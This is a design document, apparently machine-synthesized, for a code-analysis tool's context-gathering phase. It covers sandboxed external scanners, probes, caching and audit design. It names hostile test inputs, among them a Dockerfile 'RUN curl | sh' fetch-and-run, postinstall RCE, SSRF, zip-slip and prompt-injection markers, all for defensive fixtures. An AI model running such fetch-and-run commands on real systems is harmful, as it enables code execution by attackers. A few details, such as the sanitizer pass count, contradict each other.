# Phase 2 — Context gathering — Layers B–G: Final design

**Status:** Design of record (synthesized from three competing designs + critique).
**Synthesized by:** Graph-of-Thought synthesizer subagent
**Date:** 2026-05-12
**Sources:** `design-performance.md` [P] · `design-security.md` [S] · `design-best-practices.md` [B] · `critique.md`

Provenance tags below: `[P]`, `[S]`, `[B]` for single-lens; `[P+S]`, `[P+B]`, `[S+B]` for two-lens agreement; `[all]` unanimous; `[synth]` synthesizer departure from all three.

---

## Lens summary

The three lenses split cleanly on the three load-bearing decisions of this phase:

- **[B] gets the shape and is the default contract surface.** 17 probe files added under `src/codegenie/probes/`, six thin CLI wrappers under `src/codegenie/tools/`, one Skills loader package, schema additions only. The `tools/` chokepoint (one wrapper per external CLI returning a Pydantic model) is the right abstraction and the right place for tool-version drift to land. The blind spot is **Layer C deferral** — `SBOM`/`CVE`/`RuntimeTrace` shoved to Phase 5 — which is a direct roadmap-scope violation (Phase 2's tooling list names `syft`/`grype`; Phase 3 depends on CVE evidence) and the critic's strongest single attack.
- **[S] gets the threat model.** Phase 2 is the first phase that **executes foreign code on hostile input** (`scip-typescript`, `docker build`, `docker run`, `semgrep`, `gitleaks`, `syft`, `grype`, tree-sitter grammars). The honesty-oracle framing of `IndexHealthProbe` (B2), the secret-fingerprint discipline, the prompt-injection-marker tagger over `RepoNotesProbe` bodies, the SSRF guard, the audit-chain rolling BLAKE3, and the cache-key inclusion of tool digests are all keepers. The blind spots are **gold-plating** (`SandboxStrategy` four-way interface, local registry mirror, `codegenie/probe-runtime` image — none warranted by Phase 2 alone, all forward-declaring Phase 5/14 architecture ADR-0019 explicitly defers), **B5 over-correction** (forbidding the package manager altogether emits a fabricated graph dressed as evidence — violates "facts, not judgments"), and **`scip-typescript` with no `node_modules` resolution**, which destroys SCIP coverage on real OSS fixtures in CI and renders B2's staleness signal useless because every run reports `confidence: medium` for the wrong reason.
- **[P] gets the seam.** Tier-0/1/2/3 cost-routing, per-file findings caches keyed on `(content_hash, rule_pack_version)`, BLAKE3 content-addressed everything, the slice pre-shaping for the four Phase-8 hot views (`risk_flags`, `confidence_summary`, `available_skills`, `entrypoint`). The blind spots are the **DaemonPool** (smuggles cross-gather state into cache keys — the critic's strongest attack on this lens; violates ADR-0006's deterministic-gather invariant), the **`scip-typescript --stdio` dependency** (unverified upstream feature the whole performance model rests on), the **50 ms hard budget on B2 with `git rev-list` in its hot path** (the budget is unachievable, so the most-important probe permanently lies), the **gating of `RuntimeTraceProbe` behind `applies_to_tasks` that don't exist yet** (effective deferral disguised as completeness), and **tantivy-by-default** (dead code in CI; the ripgrep fallback is the actual path).

The synthesis picks **[B]'s shape, [S]'s threat model and audit discipline, [P]'s per-file findings cache and content-addressed `.codegenie/index/` namespace** — refuses **the DaemonPool, the SandboxStrategy four-way interface, the local registry mirror, the probe-runtime image, B5 static-only, B5 with `--ignore-scripts`-off, the 50 ms hard-fail B2 budget, the `peer_outputs` Mapping on `ProbeContext`, tantivy-by-default, full deferral of Layer C** — and **departs from all three** on the two questions the critic flagged as unresolved by any single lens:

1. **Layer C scope.** Ship `DockerfileProbe`, `SBOMProbe`, `CVEProbe`, `ShellUsageProbe`, `CertificateProbe`, `EntrypointProbe` in Phase 2 against a **minimal subprocess sandbox profile** (per-invocation `bwrap` on Linux + `sandbox-exec` on macOS + Phase 1's env-strip and rlimits, identical shape to Phase 1's parser sandbox but with `docker`/`syft`/`grype` added to `ALLOWED_BINARIES`). **Defer `RuntimeTraceProbe` (C4) to Phase 5** as the *only* deferred Layer-C probe — because (a) it is the one probe that requires `--privileged`/`CAP_SYS_PTRACE` to be useful, (b) it depends on a sandbox stack ADR-0019 has not resolved, (c) Phase 3's "deterministic vuln-remediation recipes" needs CVE/SBOM evidence but not runtime-trace evidence, and (d) the localv2.md §5.3 C4 design itself anticipates "80 s wall-clock when run" — premature for the local POC. Phase 2 ships the probe **class** with `applies()` returning `False` and the sub-schema declaring `runtime_trace_pending: true`, so B2 reports `not_run` honestly. The critic's "shared blind spot" — all three lenses accepting unsandboxed gather on dev laptops — is partially addressed by the per-subprocess sandbox profile, fully addressed in Phase 5/14.
2. **B2 honesty without B2 tyranny.** `IndexHealthProbe` runs *last*, has `cache_strategy = "none"`, runs in-process pure-Python over a **frozen snapshot of peer probe outputs** the coordinator passes by argument — *not* a `ProbeContext.peer_outputs` Mapping that mutates after probe-start. Its budget is **advisory** (200 ms target, no hard kill); it never fails the gather. The `--strict` CLI flag from [B] is what lets CI fail loud on `low` confidence; default behavior is exit-0 with a `confidence_summary` slice. The seeded-staleness fixture is the roadmap-exit-criterion test, and it covers **three domains** (SCIP, SBOM, semgrep rule-pack drift) — not just SCIP — so the exit criterion is meaningfully met.

Where `localv2.md` §5 and a lens disagree, `localv2.md` wins (Phase 0 §2.3 conformance rule). The one explicit Phase-2 deviation from `localv2.md` §5 (deferring C4 alone) is captured as a Phase-2 ADR and tracked as a Phase-5 hard dependency.

---

## Goals (concrete, measurable)

- **Functional (roadmap exit):** `codegenie gather` produces a useful `repo-context.yaml` populating every Layer-B, Layer-C-except-C4, Layer-D, Layer-E-stub-or-real, Layer-G slice on a real Node.js TypeScript repo. **`tests/integration/test_phase2_real_oss.py` runs against `nestjs/nest` (or equivalent) at a pinned SHA** and asserts every slice is populated, every sub-schema validates, `IndexHealthProbe` reports `high` on a fresh checkout and `low` on the seeded-staleness fixture. `[B+roadmap]`
- **Roadmap exit criterion — IndexHealthProbe surfaces real staleness:** Three deliberately-seeded staleness fixtures land in CI: `tests/fixtures/stale_scip_repo/` (SCIP index built against an older commit than HEAD), `tests/fixtures/stale_sbom_repo/` (Dockerfile content hash changed since last SBOM run), `tests/fixtures/stale_semgrep_rulepack_repo/` (rule-pack version pinned to a deprecated version). Each fixture produces `confidence: low` on its specific domain; `tests/integration/test_index_health_staleness_seeded.py` asserts all three. `[synth — generalizes [B]'s single SCIP fixture]`
- **Probe contract preserved (ADR-0007):** Zero edits to `src/codegenie/probes/base.py`. Zero edits to `ProbeContext`'s public field set in Phase 0/1; the `peer_outputs` snapshot is passed to `IndexHealthProbe.run()` as an **argument**, not a context field — done via a coordinator-private dispatcher path that the probe ABC sees as a normal `run(ctx, snapshot)` call with a special-cased binding done in the coordinator for probes whose `requires` covers other probes' outputs (and *only* if the probe declares `consumes_peer_outputs: True` as a class attribute — same precedent as `applies_to_tasks`). `[synth — vetoes [B]'s coordinator-touch + critic §3.3]`
- **Adversarial robustness:** Phase 1's adversarial corpus extends with hostile inputs covering: SCIP corruption, semgrep ReDoS, gitleaks redaction bypass attempts, tsconfig `extends:` traversal, Dockerfile `RUN curl | sh`, postinstall RCE attempt against B5, prompt-injection marker in `RepoNotesProbe` body, SSRF against `ExternalDocsProbe`, hostile YAML in a SKILL.md, zip-slip in `ExternalDocsProbe`. **Target ≥ 60 hostile fixtures**, CI-gating. `[S+B + synth target raised from [B]'s implicit floor]`
- **Wall-clock targets (advisory; surfaced via Phase 0 bench infrastructure, *not* PR-blocking):**
  - Cold gather on the 1k-file `nestjs/nest` fixture (every Phase 0+1+2 probe miss, C4 skipped): **p50 ≤ 90 s, p95 ≤ 150 s.** Dominated by SCIP indexing (~25 s), SBOM build+scan (~30 s), semgrep (~15 s). `[synth — relaxed from [P]'s 60 s, tightened from [B]'s 120 s]`
  - Warm gather (all cache hits): **p50 ≤ 1.5 s, p95 ≤ 3 s.** Phase 1's ratio holds. `[B+synth]`
  - Incremental gather (one TS file changed): **p50 ≤ 4 s, p95 ≤ 8 s.** SCIP delta dominates; per-file findings caches hit for everything else. `[synth — drops [P]'s 400 ms target since the DaemonPool that backed it is rejected]`
- **Hard caps in every Phase-2 parser (in-process, fail-loud):** SCIP index file ≤ 200 MB; semgrep findings JSON ≤ 50 MB; gitleaks findings JSON ≤ 10 MB; SBOM JSON ≤ 20 MB; CVE JSON ≤ 10 MB; markdown body ≤ 5 MB per file; tree-sitter per-file parse wall-clock ≤ 5 s; per-probe wall-clock ≤ `timeout_seconds` (Phase 0 coordinator enforces). Cap breach → typed exception → `ProbeOutput(confidence="low", errors=[...])`. `[S]`
- **Per-file findings cache invariant:** semgrep, gitleaks, tree-sitter findings cache at the `(file_content_blake3, rule_pack_version, grammar_version)` key. **Cross-file taint mode is opt-in only and bypasses the per-file cache.** Phase 1's cache key derivation extends; nothing in the cache code changes shape. `[P + synth — [P]'s per-file caches, scoped to single-file rule families only]`
- **Tool-digest pinning (security supply chain):** `tools/digests.yaml` enumerates SHA-256 digests for `scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks`, plus tree-sitter grammar wheel hashes (already in `uv.lock`). Cache key for every Phase-2 probe includes the relevant tool digest. CI verifies the binary digests on every install. **A drift is a release-gating failure.** `[S]`
- **Subprocess sandbox profile (Linux + macOS dev parity):** Every Phase 2 external CLI invocation goes through Phase 1's `run_in_sandbox` helper. Phase 2 extends the profile with: `--network=none` by default; an explicit per-tool allowlist for tools that need scoped egress (`grype db update` is the only Phase-2 tool with a documented egress need, gated by an explicit flag and only on cache-miss); `--ro-bind` for the analyzed repo; `--tmpfs` for `/tmp`; `--unsetenv` strip of every credential-shaped env var (Phase 1's list extended for `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `CHAINGUARD_TOKEN`, etc.). **No new `SandboxStrategy` interface; no rootless Podman; no probe-runtime image; no local registry mirror.** `[synth — refuses [S]'s gold-plating; preserves [S]'s threat model via Phase 1's existing chokepoint extended]`
- **C-layer probe (excluding C4) execution posture:** `docker build` for `SBOMProbe` runs inside the subprocess sandbox; build context is the analyzed repo's path; `docker buildx`'s `--no-cache-filter` and `--network=none` (during build steps; pulls are network-bounded to the configured registry) are the default. `syft` and `grype` scan the produced image; no `docker run` of the produced image (that's C4). The Dockerfile `RUN curl | sh` case is handled by **letting the build fail inside the sandbox** and recording `build_status: failed, network_egress_attempted: <observed bool>`. `[S — without the local registry mirror]`
- **No outbound network in `codegenie` itself:** Phase 0's structural ban (`fence` CI job, no `httpx`/`requests`/`socket` under `src/codegenie/`) extends to Phase 2's new tools wrappers. The only Phase 2 process that touches the network is `grype db update`, invoked exactly once per gather *on cache miss* via the sandboxed subprocess. `ExternalDocsProbe` (D8) `url_list` mode is deferred to **filesystem-only sources in Phase 2**; URL fetch is a Phase-2 ADR-gated future addition. `[S+synth — narrows [S]'s SSRF posture into a hard scope reduction]`
- **OutputSanitizer Pass 4 (secret-finding fingerprinter) and Pass 5 (prompt-injection marker tagger):** Both land in Phase 2 as additions to Phase 0's two-pass chokepoint, lifting Phase 0's pass count from 2 to **4** (the prompt-injection tagger emits metadata only and is `Pass 4b` structurally — keeping Phase 0's pass count at 4 with Pass 4 split into 4a fingerprinting and 4b marker-tagging would be more honest about ordering, but the linear pass list is 4 numbered passes). `[S]`
- **Schema discipline:** Per-probe sub-schemas under `src/codegenie/schema/probes/`, one per new probe, each `additionalProperties: false` at its own root. Envelope's `probes.*` keeps `additionalProperties: true`. The cross-probe dependency rule from [S] (`if cve_scan.* present then index_health.cve.confidence MUST be present`) lands as a Draft 2020-12 `if/then` keyword in the envelope schema. `[B+S]`
- **Tokens per run:** 0. `[all]` Phase 0 `fence` CI job extended to forbid `tantivy` ML deps if ever added.
- **Extension by addition:** Phase 2 adds **only new files** under `src/codegenie/{probes,tools,skills,catalogs,schema/probes}/`, `tests/{unit,adv,integration,golden,bench}/`, `tests/fixtures/`. The only edits to existing Phase 0/1 files are:
  1. `src/codegenie/probes/__init__.py` — 17 new `from . import ...` lines (the documented extension seam). `[B+all]`
  2. `src/codegenie/exec.py` — six entries added to `ALLOWED_BINARIES` (`scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks`, `docker`) each gated by a per-binary Phase-2 ADR documenting threat + invocation pattern. `[B]`
  3. `src/codegenie/output_sanitizer.py` — Pass 4 (fingerprinter) and Pass 5 (marker tagger) added as new method calls; existing passes unchanged. `[S]`
  4. `src/codegenie/coordinator.py` — addition of the "peer-output binding" code path for probes declaring `consumes_peer_outputs = True` (one class attribute; one branch in the dispatch loop; no shape change to `ProbeContext` itself). `[synth — minimal coordinator surface change, Phase-2 ADR-gated]`
- **No new top-level packages** beyond `src/codegenie/tools/` and `src/codegenie/skills/` (both [B]'s shape). `[B]`
- **No new architectural infrastructure beyond the single Python CLI:** no DaemonPool, no SandboxStrategy interface, no local registry mirror, no probe-runtime image, no `views.json`, no MCP shim. `[synth — vetoes [P]'s and [S]'s scope creep, same Phase-1 precedent]`

---

## Architecture

```
                                codegenie gather <path>
                                          │
                                          ▼
                       ┌──────────────────────────────────┐
                       │ Phase 0 CLI / Phase 1 readiness  │   unchanged
                       │  + extended tool checks for       │
                       │    semgrep / syft / grype /        │
                       │    gitleaks / scip-typescript /    │
                       │    tree-sitter / docker            │
                       └─────────────┬────────────────────┘
                                     │
                                     ▼
                       ┌──────────────────────────────────┐
                       │ Phase 0 Coordinator              │
                       │  + Phase 1 ParsedManifestMemo    │
                       │  + Phase 2 PeerOutputBinding     │   ← one-branch addition
                       │    (only for probes declaring     │     gated by ADR
                       │     consumes_peer_outputs=True)   │
                       └─────────────┬────────────────────┘
                                     │
        ┌────────────────────────────┴────────────────────────────────┐
        │  Phase 1 Probe Registry (explicit import — no entry points) │
        │                                                              │
        │  ┌── Phase 1 (Layer A — unchanged) ─────────────────────┐    │
        │  │  language_detection · node_build_system ·            │    │
        │  │  node_manifest · ci · deployment · test_inventory    │    │
        │  └──────────────────────────────────────────────────────┘    │
        │                                                              │
        │  ┌── Phase 2 (new files; 17 probes) ──────────────────┐      │
        │  │  Layer B (Semantic Index)                            │     │
        │  │    scip_index · index_health · node_reflection ·     │     │
        │  │    generated_code · build_graph                      │     │
        │  │  Layer C — static + image-time, but not runtime     │     │
        │  │    dockerfile · syft_sbom · grype_cve ·              │     │
        │  │    shell_usage · certificate · entrypoint            │     │
        │  │    runtime_trace (class only; applies() = False)    │     │
        │  │  Layer D (Organizational)                            │     │
        │  │    repo_config · skills_index · adr · convention ·   │     │
        │  │    exception · policy · repo_notes ·                 │     │
        │  │    external_docs (filesystem-only) ·                 │     │
        │  │    external_docs_index                               │     │
        │  │  Layer E (Cross-repo — stubs except E1 OwnershipProbe)│    │
        │  │  Layer G (SAST + behavioral hints)                   │     │
        │  │    semgrep · ast_grep · test_coverage_map ·          │     │
        │  │    invariant_hints · grep · gitleaks                 │     │
        │  └──────────────────────────────────────────────────────┘     │
        └─────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
        ┌──────────────────────────────────────────────────────────┐
        │ src/codegenie/tools/  ← NEW package (thin CLI wrappers)  │
        │   semgrep.py · syft.py · grype.py · gitleaks.py ·        │
        │   scip_typescript.py · treesitter.py · docker.py         │
        │   Each: typed Pydantic model + run(...) -> Model         │
        │   Each: calls codegenie.exec.run_in_sandbox()            │
        └──────────────────────────────────────────────────────────┘
                                     │
                                     ▼
        ┌──────────────────────────────────────────────────────────┐
        │ src/codegenie/skills/  ← NEW (loader, not Skill content)  │
        │   loader.py — discovers, validates, indexes SKILL.md      │
        │     ROOTS PASSED EXPLICITLY — NO ~/ AT CACHE-KEY TIME     │
        │   models.py — Pydantic Skill manifest                     │
        │   schema/skill.schema.json                                │
        └──────────────────────────────────────────────────────────┘
                                     │
                                     ▼
        ┌──────────────────────────────────────────────────────────┐
        │ src/codegenie/catalogs/  ← extended                       │
        │   native_modules.yaml (Phase 1)                           │
        │   ci_providers.yaml (Phase 1)                             │
        │   conventions/node.yaml + _schema.json (closed enum)      │
        │   shell_replacements/node.yaml + _schema.json             │
        │   semgrep_rule_packs.yaml (which packs per task)          │
        │   tools/digests.yaml (binary SHA-256 pin manifest)        │
        └──────────────────────────────────────────────────────────┘
                                     │
                                     ▼
        Phase 0 sandbox subprocess (rlimits + bwrap/sandbox-exec
        + env strip + --network=none default + per-tool allowlist)
                                     │
                                     ▼
        Per-probe cache (Phase 0/1) + per-file findings sub-cache
        (NEW: .codegenie/cache/semgrep/by-file/, gitleaks/by-file/,
              tree-sitter/by-file/ — keyed on file content BLAKE3)
                                     │
                                     ▼
        OutputSanitizer (Phase 0 passes 1+2, Phase 1 pass 3 — size/depth cap,
        Phase 2 pass 4: secret-finding fingerprinter,
        Phase 2 pass 5: prompt-injection marker tagger)
                                     │
                                     ▼
        Schema Validator (per-probe sub-schemas; cross-probe dependency rule)
                                     │
                                     ▼
        Writer + AuditWriter (Phase 0/1; Phase 2 adds rolling BLAKE3 chain head
        to runs/<utc>.json — verified on next gather start)
                                     │
                                     ▼
        .codegenie/context/
        ├── repo-context.yaml   (envelope + ~17 new slices)
        ├── raw/                (per-probe JSON + scip-index.scip + sbom.json +
        │                        gitleaks-findings.json + notes/*.md 0600)
        └── runs/<utc>-<short>.json  (chain head + per-probe metadata)
        .codegenie/cache/
        ├── blobs/              (Phase 0 layout)
        ├── semgrep/by-file/    (NEW Phase 2 — per-file findings)
        ├── gitleaks/by-file/   (NEW Phase 2)
        └── tree-sitter/by-file/(NEW Phase 2)
        .codegenie/index/
        └── scip-index.scip     (NEW Phase 2 — per-repo binary artifact,
                                  rewritten in place; not under cache/;
                                  cache gc extended to manage)
```

Three load-bearing observations:

1. **Every Phase 0/1 box says "unchanged" except for one ADR-gated coordinator branch and Pass 4/5 in the sanitizer.** Same test as Phase 1. `[B + critic §3.3 addressed]`
2. **The `tools/` package is the chokepoint.** Probes never call `subprocess.run` or parse raw tool stdout. Tool wrappers are the only code that knows about exit codes, JSON shapes, and `stderr` quirks. `[B]`
3. **The subprocess sandbox profile is the *one* security layer**, applied at Phase 1's existing `run_in_sandbox` chokepoint. No `SandboxStrategy` interface; no rootless Podman. Phase 5's microVM lands as a new branch *inside* `run_in_sandbox` when ADR-0019 resolves — the rest of the codebase doesn't move. `[synth — preserves [S]'s threat model with [B]'s single-chokepoint discipline]`

---

## Components

### 1. CLI wrappers — `src/codegenie/tools/`

- **Provenance:** `[B]`
- **Purpose:** Centralize all knowledge about external CLI invocation, exit codes, stdout/stderr shapes, and JSON quirks in one place per tool. Probes consume **typed Pydantic models**, never raw subprocess output.
- **Interface:** Each wrapper exports `async run(...) -> <Tool>Result`. Inputs include the analyzed repo root, tool-specific options, a `timeout_s` ceiling, and a `raw_output_path` that the wrapper writes to *before* parsing (so the raw artifact survives even if the wrapper crashes mid-parse). Outputs are Pydantic models with the same field naming as Phase 1's probe outputs. Errors are typed: `ToolNotFound`, `ToolTimeout`, `ToolNonZeroExit`, `ToolOutputMalformed`. Each carries `stderr` (truncated to 1 KB).
- **Internal design:** Calls `codegenie.exec.run_in_sandbox` from Phase 0/1; never `subprocess.run`. Output JSON written to `raw_output_path` first, then `pydantic.TypeAdapter(<Result>).validate_json(...)`. Six modules: `semgrep.py`, `syft.py`, `grype.py`, `gitleaks.py`, `scip_typescript.py`, `treesitter.py`. One extra (`docker.py`) for `docker build` invocation used by `SyftSBOMProbe`.
- **Why this choice over alternatives:** The DaemonPool from [P] would amortize fork+exec but introduces cross-gather state into the cache key (critic §1.1 — violates ADR-0006). The wrapper-per-tool approach preserves determinism. Conflict-resolution row D1 in the ledger below.
- **Tradeoffs accepted:**
  - Six small modules instead of one big one. Single-responsibility wins. `[B]`
  - Fork+exec cost (~200-300 ms per tool invocation) is paid every gather. Mitigated by per-probe caching (warm path is mostly cache hits) and per-file findings sub-caches (incremental path re-runs only on changed files). The DaemonPool's amortization is *not* recovered — accepted cost, documented in §"Resource & cost profile". `[synth]`

### 2. Subprocess sandbox profile extension — `src/codegenie/exec.py`

- **Provenance:** `[S + synth — Phase 1's chokepoint extended, not replaced]`
- **Purpose:** Every Phase 2 external CLI runs inside Phase 1's `run_in_sandbox` with a profile tightened for Phase 2's surface (code-loading interpreters, image builds).
- **Interface:** Phase 1's `run_in_sandbox(argv, *, allowlist, env, timeout_s, cwd, network, ...)` extended with `network: Literal["none", "scoped"] = "none"` (default `"none"`; `"scoped"` enables a specific tool allowlist defined per-tool). `bwrap` on Linux is invoked with `--unshare-all --share-net` only when `network="scoped"`; `--unshare-net` (no network) is the default.
- **Internal design:** Phase 1's `bwrap` invocation extended with: `--unsetenv` for every credential-shaped name (Phase 1 list + Phase 2 additions); `--tmpfs /tmp`; `--ro-bind <repo-root> /repo`; `--ro-bind <tools-bin-dir> /usr/local/bin`; `--die-with-parent`. macOS path uses `sandbox-exec` with an equivalent profile (sandbox-exec only goes so far; on macOS `--network=none` is best-effort via `sandbox-exec` `(deny network*)`; the docs note this).
- **Why this choice over alternatives:** [S]'s `RootlessPodmanContainer` is a full Phase-2 new abstraction (`SandboxStrategy` interface, four planned implementations, registry mirror) that ADR-0019 has explicitly deferred. The Phase-1 critic explicitly flagged the same shape ("brand-new architectural layer Phase 0 never sanctioned") and lost; Phase 2 cannot import it now without reversing that decision. Conflict-resolution row D2.
- **Tradeoffs accepted:**
  - `bwrap` / `sandbox-exec` is a kernel-shared sandbox, weaker than a microVM or rootless Podman. A kernel zero-day in `io_uring` / `epoll` breaks the boundary. **Phase 14's production worker will adopt the microVM via the same chokepoint; the chokepoint API does not change.** `[synth]`
  - macOS `--network=none` enforcement is best-effort. Documented loudly. `[synth]`
  - No probe-runtime image, no pre-pinned registry mirror. Means `docker build` pulls base images from the configured registry (which may be `docker.io`); pulls happen inside the sandbox with `network="scoped"` and the configured registry host on the allowlist. **Trades supply-chain isolation for not introducing a long-lived service to the POC.** `[synth]`

### 3. Layer B probes

#### 3.1 `SCIPIndexProbe` (B1)

- **Provenance:** `[B + S threat model + synth on node_modules policy]`
- **Purpose:** Run `scip-typescript` over the analyzed repo's TypeScript program; emit `semantic_index` slice. Per `localv2.md §5.2 B1`.
- **Interface:** Probe ABC. `declared_inputs = ["tsconfig*.json", "package.json", "src/**/*.{ts,tsx,mts,cts,js,mjs,cjs}", "pnpm-lock.yaml", "yarn.lock", "package-lock.json"]`. `requires = ["language_detection", "node_build_system"]`. `applies_to_languages = ["typescript", "javascript"]`. `timeout_seconds = 600`. `sandbox: network="none"`.
- **Internal design:**
  - Calls `tools.scip_typescript.run(repo_root, raw_output_path=ctx.output_dir / ".codegenie/index/scip-index.scip", timeout_s=600)`.
  - **`node_modules` policy is conditional, not all-or-nothing.** If `node_modules/` exists in the repo at gather time, the probe uses it (mount read-only into the sandbox; `scip-typescript` resolves imports against it). If absent, the probe **does not invoke `npm install`** — but it does walk `pnpm-lock.yaml` / `yarn.lock` / `package-lock.json` and reports `node_modules_present: false, lockfiles_resolved: true, coverage_pct: <reduced>`. Confidence is `medium` (not `low`) when `node_modules` is absent but lockfiles are resolvable.
  - Cache key includes `scip-typescript` digest from `tools/digests.yaml`.
  - SCIP binary artifact written to `.codegenie/index/scip-index.scip` (per-repo binary; not a per-probe cache blob — its lifecycle is per-repo, not per-gather).
- **Why this choice over alternatives:** [S]'s "no `node_modules` resolution ever" destroys SCIP coverage in CI on real OSS fixtures (critic §S.3 — the strongest single attack on [S]). [P]'s DaemonPool depends on `scip-typescript --stdio`, which the design itself admits may not exist (critic §P.2). The wrapper approach with conditional `node_modules` mount captures the security-relevant restriction (we never *create* `node_modules` by running `npm install`, which is the postinstall RCE path) while keeping evidence quality high (we *do* honor an existing `node_modules` directory). Conflict-resolution row D3.
- **Tradeoffs accepted:**
  - **Repos without committed `node_modules` get `medium` confidence on SCIP.** Honest. Documented. The Planner factors this in. `[synth]`
  - **No incremental SCIP indexing** (rejecting [P]'s 1.5 s delta target). Full re-index on every TS-source change. Cost: ~25 s per cold gather. Acceptable for the POC. Phase 14's production worker may revisit. `[synth]`
  - `scip-typescript` itself is a code-loading interpreter; a TypeScript-compiler-bug RCE inside the sandbox is contained by `--network=none` + ro-bind + env-strip but not by an outer microVM. **The parent re-validates the `.scip` output against the SCIP grammar before merging** (cheap; protobuf parser is well-fuzzed). `[S]`

#### 3.2 `IndexHealthProbe` (B2) — the honesty oracle

- **Provenance:** `[B shape + S framing + synth on budget and failure-mode posture]`
- **Purpose:** Surface freshness, coverage, and staleness across every other probe so a downstream consumer cannot silently consume a stale slice. The roadmap calls this "the single most important probe"; this design treats it as the **load-bearing observability control**, not a circuit breaker.
- **Interface:** Probe ABC. `name = "index_health"`. `requires = [...all index-producing Phase-2 probes...]`. `declared_inputs = ["__git__:HEAD"]` (special token: cache invalidates on git HEAD move). `applies_to_tasks = ["*"]`. `cache_strategy = "none"`. `consumes_peer_outputs = True` (declares to the coordinator that it needs the frozen snapshot of peer outputs). `timeout_seconds = 30` (advisory; not hard-killed).
- **Internal design:**
  - **Structurally identical to every other probe** at the ABC level — same `async def run(ctx, snapshot, peer_outputs)` signature; the third arg is the new positional, optional in the ABC, populated by the coordinator only when `consumes_peer_outputs = True`. Probes that don't declare this attribute don't see the extra argument. `[synth — addresses critic §3.3 by making this opt-in per probe instead of a `ProbeContext` extension]`
  - **Per-domain (`scip`, `sbom`, `cve`, `semgrep`, `gitleaks`, `runtime_trace`):** computes `last_indexed_commit` (from the upstream probe's output), `commits_behind` (via a single in-process `git rev-list --count` call — the entire B2 has *one* subprocess, and it's `git` which Phase 0 already allowlists), `coverage_pct` (from PathIndex), `indexer_errors`, `tool_digest_in_use`, and `confidence ∈ {high, medium, low}`.
  - **For `runtime_trace` domain:** since C4 is deferred, B2 always reports `runtime_trace: {status: not_applicable, reason: "C4 deferred to Phase 5"}` rather than `not_run` or `low`. This means the seeded-staleness fixture's signal is **not** drowned by C4 noise.
  - **Budget:** advisory 200 ms target, **no hard kill**. If B2 exceeds 200 ms, the gather still completes and `index_health.budget_exceeded: true` is emitted in the slice for observability. The 50 ms hard budget from [P] is rejected (critic §P.3 — the budget is unachievable with `git rev-list` in the loop, and a permanently-degraded honesty oracle is the worst outcome). `[synth]`
  - **Never fails the gather.** [S]'s "B2 fails the gather on missing dependency" is rejected (critic §S.5 — converts a hygiene probe into a global circuit breaker without a kill switch). The `--strict` CLI flag from [B] is the supported way to fail loud: `codegenie gather --strict` exits non-zero if any B2 domain reports `low`. `[B + synth]`
  - **Cross-probe schema dependency:** The envelope schema includes a Draft 2020-12 `if/then` rule: `if cve_scan.* present then index_health.cve.confidence MUST be present`. Enforced at output time. `[S]`
- **Why this choice over alternatives:** [P]'s 50 ms hard budget is unachievable (critic §P.3). [S]'s fail-the-gather is a circuit breaker (critic §S.5). [B]'s structural-symmetry-with-other-probes is correct but its `ProbeContext.peer_outputs` mutates the dataclass (critic §3.3). The synthesis combines [B]'s structural shape, [S]'s rigorous per-domain formulas + cross-schema dependency rule, [P]'s `cache_strategy = "none"` correctness — with the budget enforcement made advisory and the failure-mode policy made `--strict`-driven. Conflict-resolution rows D4 (budget), D5 (failure mode), D6 (peer-output access).
- **Tradeoffs accepted:**
  - The 200 ms advisory budget is *visible* but not *enforced*. A future probe author who adds a slow subprocess to B2 will see it in dashboards but won't be hard-stopped. Mitigation: the budget breach metric is a Phase-2 CI canary; a 25% regression in mean B2 wall-clock fails the bench job. `[synth]`
  - The `consumes_peer_outputs` class attribute is *one* coordinator branch — minimal surface, ADR-gated. `[synth]`

#### 3.3 `NodeReflectionProbe` (B3)

- **Provenance:** `[B + P per-file cache]`
- **Purpose:** Surface dynamic-dispatch patterns SCIP can't resolve. Per `localv2.md §5.2 B3`.
- **Interface:** Probe ABC. `declared_inputs = ["src/**/*.{ts,tsx,mts,cts,js,mjs,cjs}"]`. `requires = ["language_detection"]`. `applies_to_languages = ["typescript", "javascript"]`. `timeout_seconds = 60`. `sandbox: network="none"`.
- **Internal design:** Calls `tools.treesitter.query(...)` with the per-language query pack from `src/codegenie/probes/_reflection_queries/node.yaml`. Pre-compiled tree-sitter queries (eval, dynamic require/import, decorator presence, middleware chain shape, env-var-gated branches). **Per-file findings cache**: each file's query results are stored at `.codegenie/cache/tree-sitter/by-file/<file_blake3>.<grammar_version>.msgpack` and reused if the file content hasn't changed. `[P]`
- **Why this choice over alternatives:** Tree-sitter parses TS at ~10k LOC/s; per-file caching saves the redundant cost on incremental gathers. The DaemonPool approach is rejected (no daemon needed; tree-sitter is loaded in-process via Python bindings — exactly the case where [P]'s observation about "no fork+exec cost" is real).

#### 3.4 `GeneratedCodeProbe` (B4)

- **Provenance:** `[P + B]`
- **Purpose:** Identify generated code so the Planner doesn't try to edit it. Per `localv2.md §5.2 B4`.
- **Interface:** Probe ABC. `declared_inputs = ["src/**/*.{ts,tsx,mts,cts,js,mjs,cjs}", "src/generated/**", "src/**/__generated__/**", "schema.prisma", "package.json"]`. `requires = ["language_detection", "node_manifest"]`. `timeout_seconds = 30`.
- **Internal design:** Header-pattern match first (read first 256 bytes, regex against `// Generated by`, `# Generated by`, `/* DO NOT EDIT */`, etc.); dependency-based detection second (from Phase 1's `ParsedManifestMemo`-aware helper, check for `@graphql-codegen/cli`, `openapi-typescript`, `prisma`, `protobuf`); tree-sitter parse only for ambiguous files. Header patterns live in `src/codegenie/probes/_generated_code_patterns.yaml` (catalog). `[P]`

#### 3.5 `BuildGraphProbe` (B5) — `pnpm list -r --ignore-scripts`

- **Provenance:** `[synth — refuses [P]'s static-only-via-`networkx`, refuses [S]'s static-only-via-package-manager-ban, refuses [B]'s `pnpm list` without `--ignore-scripts`]`
- **Purpose:** Module-dependency graph for monorepos. Per `localv2.md §5.2 B5` (which calls for invoking the package manager).
- **Interface:** Probe ABC. `declared_inputs = ["pnpm-workspace.yaml", "package.json", "packages/*/package.json", "apps/*/package.json", "libs/*/package.json", "lerna.json", "nx.json", "turbo.json", "pnpm-lock.yaml", "yarn.lock", "package-lock.json"]`. `requires = ["language_detection", "node_build_system"]`. `applies_to_languages = ["typescript", "javascript"]`. `applies()` returns `False` for non-monorepo repos (gated by Phase 1's `LanguageDetectionProbe.monorepo` flag). `timeout_seconds = 60`. `sandbox: network="none"`.
- **Internal design:**
